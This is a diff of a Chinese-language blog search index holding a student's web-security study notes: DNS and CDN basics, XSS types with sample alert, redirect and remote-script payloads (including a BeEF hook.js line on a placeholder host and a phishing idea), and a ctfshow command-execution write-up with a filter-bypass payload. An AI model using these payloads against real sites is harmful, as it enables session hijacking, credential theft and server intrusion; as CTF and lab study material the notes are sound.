@@ -1,14 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>网安篇（1）</title>
-    <url>/2022/10/01/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%881%EF%BC%89/</url>
-    <content><![CDATA[<h5 id="域名："><a href="#域名：" class="headerlink" title="域名："></a>域名：</h5><p>顶级域名，又称一级域名，常见的有”.com”、”.org”、”.net”、”.cn”等<br><a href="http://baidu.com/">http://baidu.com</a> 一级域名<br>二级域名<br>bbs.baidu .com 二级域名<br>tieba.baidu .com 二级域名<br>多级域名：<br><strong>.</strong>.__.com</p>
+    <title>网安篇（3）</title>
+    <url>/2022/10/02/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%883%EF%BC%89/</url>
+    <content><![CDATA[<h4 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h4><h5 id="xss主要分类："><a href="#xss主要分类：" class="headerlink" title="xss主要分类："></a>xss主要分类：</h5><p>反射型xss攻击（Reflected XSS） ：又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻<br>击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。<br>存储型XSS（Stored XSS) ：又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据 库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大, 因为每当用户打开页面，查看内容时脚本将自动执行。</p>
 <span id="more"></span>
-<p>顶级域名：<br>com 商业机构<br>edu 教育及研究机构<br>firm 公司企业<br>gov 政府机构<br>info 信息服务<br>net 网络服务机构<br>nom 个人<br>org 专业团体<br>rec 娱乐类机构<br>store 销售类公司企业<br>web 从事WWW活动的机构</p>
-<h5 id="DNS是什么："><a href="#DNS是什么：" class="headerlink" title="DNS是什么："></a>DNS是什么：</h5><p>DNS是域名系统,Domain Name System的缩写,服务域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。<br>DNS就是把域名解析为IP地址，提供我们上网，我们能够上网最终是找到IP地址。<br>比如，<a href="http://xxxx.com是域名,那么他的ip地址假设是144.144.144.144,我们用浏览器访问该的网页,先到dns服务器找http//xxxx.com%E5%AF%B9%E5%BA%94%E7%9A%84IP%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E9%80%9A%E8%BF%87IP%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E3%80%82">http://xxxx.com是域名，那么他的IP地址假设是144.144.144.144，我们用浏览器访问该的网页，先到DNS服务器找http://xxxx.com对应的IP地址，然后通过IP地址进行访问。</a><br>域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。<br>DNS服务器地址:<br>域名解释服务器,打比方,当你在地址栏输入 <a href="http://www.dns.com/">www.dns.com</a> 时,电脑不是直接就连接到百度的服务器里的,而是先向这个DNS服务器查询<a href="http://www.dns.com的ip地址,然后再按照这个ip地址转到百度的服务器里.一般都是每个地区有一个特定的dns服务器的,由isp提供的/">www.dns.com的IP地址,然后再按照这个IP地址转到百度的服务器里.一般都是每个地区有一个特定的DNS服务器的,由ISP提供的</a>.<br>由于ISP的拨号服务器一般都有缺省的DNS，所以你可以不用设置DNS，如果你需要指定一台DNS，你一定要了解这台DNS的准确IP（比如福州的163用户的DNS为202.101.98.55）。DNS设置方法如下：在“控制面板”下打开“网络”里的“TCP/IP”的“属性”，在“DNS设置”栏目选择“启用DNS”，并将DNS的IP地址添加即可。<br>IP192.168.X.X一般都是带有路由的IP，网关默认最后1位肯定是1，子网掩码 255.255.255.0简单说C类的IP，子网都可以这样设置<br>我的理解：DNS服务器地址就是将人们可以理解的域名解析成计算机可以获取的二进制语言（也就是这个域名实际所代表的IP地址）</p>
-<h5 id="什么是CDN："><a href="#什么是CDN：" class="headerlink" title="什么是CDN："></a>什么是CDN：</h5><p>cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了<br>CDN与DNS的关系：<br>dns与cdn的关系<br>刚才说到cdn实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的cdn节点呢。这就需要dns服务来进行定位了。当我们通过使用dns服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的cdn节点。<br>通过dns服务我们可以很快的定位到用户的位置，然后给用户分配最佳cdn节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的ldns的话，调度服务器会给我分配到深圳电信的cdn服务器，这样就产生了错误的调度。</p>
-<h5 id="网站程序产生漏洞："><a href="#网站程序产生漏洞：" class="headerlink" title="网站程序产生漏洞："></a>网站程序产生漏洞：</h5><p>SQL注入，文件上传，xss，代码执行，变量覆盖，逻辑漏洞，反序列化。</p>
+<h6 id="xss弹框"><a href="#xss弹框" class="headerlink" title="xss弹框"></a>xss弹框</h6><p>弹框警告<br>此脚本实现弹框提示，一般作为漏洞测试或者演示使用,类似SQL注入漏洞测试中的单引号’, 一旦此脚本能执行，也就意 味着后端服务器没有对特殊字符做过滤&lt;&gt;/‘ 这样就可以证明，这个页面位置存在了XSS漏洞。 </p>
+<p>php+HTML<br> &lt;scri.pt&gt;ale.rt(‘xss’)</p>
+<h6 id="弹框警告并重定向"><a href="#弹框警告并重定向" class="headerlink" title="弹框警告并重定向"></a>弹框警告并重定向</h6><script>al.ert("请移步到我们的新站");location.href="http://www.qfedu.com"</script> 
+<script>ale.rt('xss');location.href="http://10.1.64.35/mutillidae/robots.txt"</script> 
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;al.ert(&quot;请移步到我们的新站&quot;);location.href=&quot;http://www.qfedu.com&quot;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;al.ert(&#x27;xss&#x27;);location.href=&quot;http://10.1.64.35/mutillidae/robots.txt&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信 息，则可能在另外的站点重新登录账户（克隆网站收集账户） </p>
+<h6 id="访问恶意代码"><a href="#访问恶意代码" class="headerlink" title="访问恶意代码"></a>访问恶意代码</h6><p>&lt;scri.pt src=”<a href="http://www.qfedu.com/xss.js&quot;&gt;">http://www.qfedu.com/xss.js&quot;&gt;</a><br>&lt;scri.pt src=”<a href="http://beef_ip:3000/hook.js&quot;&gt;">http://BeEF_IP:3000/hook.js&quot;&gt;</a></p>
 ]]></content>
       <categories>
         <category>——网络安全</category>
@@ -34,18 +38,51 @@
       </tags>
   </entry>
   <entry>
-    <title>网安篇（3）</title>
-    <url>/2022/10/02/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%883%EF%BC%89/</url>
-    <content><![CDATA[<h4 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h4><h5 id="xss主要分类："><a href="#xss主要分类：" class="headerlink" title="xss主要分类："></a>xss主要分类：</h5><p>反射型xss攻击（Reflected XSS） ：又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻<br>击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。<br>存储型XSS（Stored XSS) ：又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据 库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大, 因为每当用户打开页面，查看内容时脚本将自动执行。</p>
+    <title></title>
+    <url>/2022/10/31/image/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>网安篇（1）</title>
+    <url>/2022/10/01/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%881%EF%BC%89/</url>
+    <content><![CDATA[<h5 id="域名："><a href="#域名：" class="headerlink" title="域名："></a>域名：</h5><p>顶级域名，又称一级域名，常见的有”.com”、”.org”、”.net”、”.cn”等<br><a href="http://baidu.com/">http://baidu.com</a> 一级域名<br>二级域名<br>bbs.baidu .com 二级域名<br>tieba.baidu .com 二级域名<br>多级域名：<br><strong>.</strong>.__.com</p>
 <span id="more"></span>
-<h6 id="xss弹框"><a href="#xss弹框" class="headerlink" title="xss弹框"></a>xss弹框</h6><p>弹框警告<br>此脚本实现弹框提示，一般作为漏洞测试或者演示使用,类似SQL注入漏洞测试中的单引号’, 一旦此脚本能执行，也就意 味着后端服务器没有对特殊字符做过滤&lt;&gt;/‘ 这样就可以证明，这个页面位置存在了XSS漏洞。 </p>
-<p>php+HTML<br> &lt;scri.pt&gt;ale.rt(‘xss’)</script></p>
-<h6 id="弹框警告并重定向"><a href="#弹框警告并重定向" class="headerlink" title="弹框警告并重定向"></a>弹框警告并重定向</h6><script>al.ert("请移步到我们的新站");location.href="http://www.qfedu.com"</script> 
-<script>ale.rt('xss');location.href="http://10.1.64.35/mutillidae/robots.txt"</script> 
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;al.ert(&quot;请移步到我们的新站&quot;);location.href=&quot;http://www.qfedu.com&quot;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;al.ert(&#x27;xss&#x27;);location.href=&quot;http://10.1.64.35/mutillidae/robots.txt&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>顶级域名：<br>com 商业机构<br>edu 教育及研究机构<br>firm 公司企业<br>gov 政府机构<br>info 信息服务<br>net 网络服务机构<br>nom 个人<br>org 专业团体<br>rec 娱乐类机构<br>store 销售类公司企业<br>web 从事WWW活动的机构</p>
+<h5 id="DNS是什么："><a href="#DNS是什么：" class="headerlink" title="DNS是什么："></a>DNS是什么：</h5><p>DNS是域名系统,Domain Name System的缩写,服务域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。<br>DNS就是把域名解析为IP地址，提供我们上网，我们能够上网最终是找到IP地址。<br>比如，<a href="http://xxxx.com是域名,那么他的ip地址假设是144.144.144.144,我们用浏览器访问该的网页,先到dns服务器找http//xxxx.com%E5%AF%B9%E5%BA%94%E7%9A%84IP%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E9%80%9A%E8%BF%87IP%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E3%80%82">http://xxxx.com是域名，那么他的IP地址假设是144.144.144.144，我们用浏览器访问该的网页，先到DNS服务器找http://xxxx.com对应的IP地址，然后通过IP地址进行访问。</a><br>域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。<br>DNS服务器地址:<br>域名解释服务器,打比方,当你在地址栏输入 <a href="http://www.dns.com/">www.dns.com</a> 时,电脑不是直接就连接到百度的服务器里的,而是先向这个DNS服务器查询<a href="http://www.dns.com的ip地址,然后再按照这个ip地址转到百度的服务器里.一般都是每个地区有一个特定的dns服务器的,由isp提供的/">www.dns.com的IP地址,然后再按照这个IP地址转到百度的服务器里.一般都是每个地区有一个特定的DNS服务器的,由ISP提供的</a>.<br>由于ISP的拨号服务器一般都有缺省的DNS，所以你可以不用设置DNS，如果你需要指定一台DNS，你一定要了解这台DNS的准确IP（比如福州的163用户的DNS为202.101.98.55）。DNS设置方法如下：在“控制面板”下打开“网络”里的“TCP/IP”的“属性”，在“DNS设置”栏目选择“启用DNS”，并将DNS的IP地址添加即可。<br>IP192.168.X.X一般都是带有路由的IP，网关默认最后1位肯定是1，子网掩码 255.255.255.0简单说C类的IP，子网都可以这样设置<br>我的理解：DNS服务器地址就是将人们可以理解的域名解析成计算机可以获取的二进制语言（也就是这个域名实际所代表的IP地址）</p>
+<h5 id="什么是CDN："><a href="#什么是CDN：" class="headerlink" title="什么是CDN："></a>什么是CDN：</h5><p>cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了<br>CDN与DNS的关系：<br>dns与cdn的关系<br>刚才说到cdn实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的cdn节点呢。这就需要dns服务来进行定位了。当我们通过使用dns服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的cdn节点。<br>通过dns服务我们可以很快的定位到用户的位置，然后给用户分配最佳cdn节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的ldns的话，调度服务器会给我分配到深圳电信的cdn服务器，这样就产生了错误的调度。</p>
+<h5 id="网站程序产生漏洞："><a href="#网站程序产生漏洞：" class="headerlink" title="网站程序产生漏洞："></a>网站程序产生漏洞：</h5><p>SQL注入，文件上传，xss，代码执行，变量覆盖，逻辑漏洞，反序列化。</p>
+]]></content>
+      <categories>
+        <category>——网络安全</category>
+      </categories>
+      <tags>
+        <tag>——web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安篇（4）</title>
+    <url>/2022/10/03/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%884%EF%BC%89/</url>
+    <content><![CDATA[<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>模式分隔符后的”i”标记这是一个大小写不敏感的搜索<br>模式中的 \b 标记一个单词边界，所以只有独立的单词”web”会被匹配，而不会匹配</p>
+<span id="more"></span>
+<p>PHP提供4个专门的执行外部命令的函数：exec(), system(), passthru(), shell_exec()</p>
+<p>除了拼接函数外，我们还可以使用命令连接符来组合这些系统函数增加命令执行成功率。常见的命令连接符有（“|，&amp;&amp;，||”这三个连接符都是Windows系统与Linux系统共有的，而“&amp;”是Windows系统特有，“；”是Linux系统特有的）：</p>
+<h4 id="管道操作符"><a href="#管道操作符" class="headerlink" title="管道操作符"></a>管道操作符</h4><p>A|B:无论执行的A命令是否正确，B命令都执行</p>
+<p>&amp;&amp;<br>逻辑与</p>
+<p>A&amp;&amp;B：只有在A命令成功执行的前提下，B命令才可以执行</p>
+<p>||<br>逻辑或</p>
+<p>A||B：只有在A命令没有执行失败的前提下，B命令才可以执行</p>
+<p>&amp;<br>A&amp;B:不管A是否执行成功，B命令都会执行</p>
+<p>;<br>A&amp;B:不管A是否执行成功，B命令都会执行</p>
+<p>命令执行漏洞</p>
+<h5 id="ctfshow29"><a href="#ctfshow29" class="headerlink" title="ctfshow29"></a>ctfshow29</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);       <span class="comment">//不输出错误</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;     <span class="comment">//接受参数</span></span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;<span class="comment">//没有匹配到flag就输出eval（&amp;c）意味着过滤了flag字符串</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信 息，则可能在另外的站点重新登录账户（克隆网站收集账户） </p>
-<h6 id="访问恶意代码"><a href="#访问恶意代码" class="headerlink" title="访问恶意代码"></a>访问恶意代码</h6><p>&lt;scri.pt src=”<a href="http://www.qfedu.com/xss.js&quot;&gt;">http://www.qfedu.com/xss.js&quot;&gt;</a></script><br>&lt;scri.pt src=”<a href="http://beef_ip:3000/hook.js&quot;&gt;">http://BeEF_IP:3000/hook.js&quot;&gt;</a></script></p>
+<p>知识点：</p>
+<p>1.linux通配符绕过：<em>匹配任意字符串/文本，包括空字符串。如 ls list -&gt; ls l</em>. ?匹配任意一个字符（不在括号内时）</p>
+<p>2.[abcd]正则 表示匹配[ ] 里的任何一个字符abcd</p>
+<p>3.[a-z] 匹配a-z的任意字符</p>
+<p>4.拼接字符串cat file.txt == ca’t’ f’i’le.txt</p>
+<p>5.换行符绕过：cat file.txt = cat f\ile.txt</p>
+<p>最终palyload: ?c=system(‘cat f*’);</p>
 ]]></content>
       <categories>
         <category>——网络安全</category>
@@ -66,7 +103,7 @@
 <p>​        -u 指定url</p>
 <p>-e 指定网站语言</p>
 <p>-w 可以加上自己的字典（带上路径）</p>
-<p>例如：<img src="https://cdn.nlark.com/yuque/0/2022/png/27996677/1667099409732-133558e3-d66c-4106-b770-e558db773eef.png" alt="img"></p>
+<p>例如：<img src="/2022/10/30/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%885%EF%BC%89/dirsearch.png"></p>
 <h2 id="1-2修改请求头为本地访问"><a href="#1-2修改请求头为本地访问" class="headerlink" title="1.2修改请求头为本地访问"></a>1.2修改请求头为本地访问</h2><p>X-Forward-For：127.0.0.1</p>
 <p>Referer：127.0.0.1</p>
 <h2 id="1-3xss漏洞"><a href="#1-3xss漏洞" class="headerlink" title="1.3xss漏洞"></a>1.3xss漏洞</h2><p>在登录界面随便输入一个账号密码，看一下返回的信息若得到错误的信息，发现url里面有get类型的错误参数，如果没有过滤的话我们将文字替换为可以得到xss漏洞，没有过滤，拿下xss。</p>
@@ -237,38 +274,6 @@
 <p>寒暑假逆袭的关键，而我却没有加以利用，认真去学习！</p>
 <p>接着开学封校，一直到九月中旬才能来校学习，这次，我不会再浪费时间，我一直以来的黑客梦永远不会消散。</p>
 <p>虽然道路艰难，但我会一直前行，漫漫长征路，偏向虎山行，此志共勉！</p>
-]]></content>
-      <categories>
-        <category>——网络安全</category>
-      </categories>
-      <tags>
-        <tag>——web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安篇（4）</title>
-    <url>/2022/10/03/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%884%EF%BC%89/</url>
-    <content><![CDATA[<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>模式分隔符后的”i”标记这是一个大小写不敏感的搜索<br>模式中的 \b 标记一个单词边界，所以只有独立的单词”web”会被匹配，而不会匹配</p>
-<span id="more"></span>
-<p>PHP提供4个专门的执行外部命令的函数：exec(), system(), passthru(), shell_exec()</p>
-<p>除了拼接函数外，我们还可以使用命令连接符来组合这些系统函数增加命令执行成功率。常见的命令连接符有（“|，&amp;&amp;，||”这三个连接符都是Windows系统与Linux系统共有的，而“&amp;”是Windows系统特有，“；”是Linux系统特有的）：</p>
-<h4 id="管道操作符"><a href="#管道操作符" class="headerlink" title="管道操作符"></a>管道操作符</h4><p>A|B:无论执行的A命令是否正确，B命令都执行</p>
-<p>&amp;&amp;<br>逻辑与</p>
-<p>A&amp;&amp;B：只有在A命令成功执行的前提下，B命令才可以执行</p>
-<p>||<br>逻辑或</p>
-<p>A||B：只有在A命令没有执行失败的前提下，B命令才可以执行</p>
-<p>&amp;<br>A&amp;B:不管A是否执行成功，B命令都会执行</p>
-<p>;<br>A&amp;B:不管A是否执行成功，B命令都会执行</p>
-<p>命令执行漏洞</p>
-<h5 id="ctfshow29"><a href="#ctfshow29" class="headerlink" title="ctfshow29"></a>ctfshow29</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);       <span class="comment">//不输出错误</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;     <span class="comment">//接受参数</span></span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;<span class="comment">//没有匹配到flag就输出eval（&amp;c）意味着过滤了flag字符串</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>知识点：</p>
-<p>1.linux通配符绕过：<em>匹配任意字符串/文本，包括空字符串。如 ls list -&gt; ls l</em>. ?匹配任意一个字符（不在括号内时）</p>
-<p>2.[abcd]正则 表示匹配[ ] 里的任何一个字符abcd</p>
-<p>3.[a-z] 匹配a-z的任意字符</p>
-<p>4.拼接字符串cat file.txt == ca’t’ f’i’le.txt</p>
-<p>5.换行符绕过：cat file.txt = cat f\ile.txt</p>
-<p>最终palyload: ?c=system(‘cat f*’);</p>
 ]]></content>
       <categories>
         <category>——网络安全</category>
